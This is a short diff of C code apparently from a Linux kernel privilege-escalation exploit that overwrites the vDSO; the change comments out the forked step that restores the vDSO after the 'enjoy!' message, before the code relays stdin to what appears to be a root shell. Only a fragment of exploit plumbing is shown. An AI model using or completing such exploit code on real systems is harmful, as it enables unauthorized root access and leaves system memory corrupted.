@@ -522,11 +522,11 @@ static int yeah(struct mem_arg *arg, int s)
 
 	fprintf(stderr, "[*] enjoy!\n");
 
-	if (fork() == 0) {
-		if (exploit(arg, false) == -1)
-			fprintf(stderr, "[-] failed to restore vDSO\n");
-		exit(0);
-	}
+	/* if (fork() == 0) { */
+	/* 	if (exploit(arg, false) == -1) */
+	/* 		fprintf(stderr, "[-] failed to restore vDSO\n"); */
+	/* 	exit(0); */
+	/* } */
 
 	fds[0].fd = STDIN_FILENO;
 	fds[0].events = POLLIN;
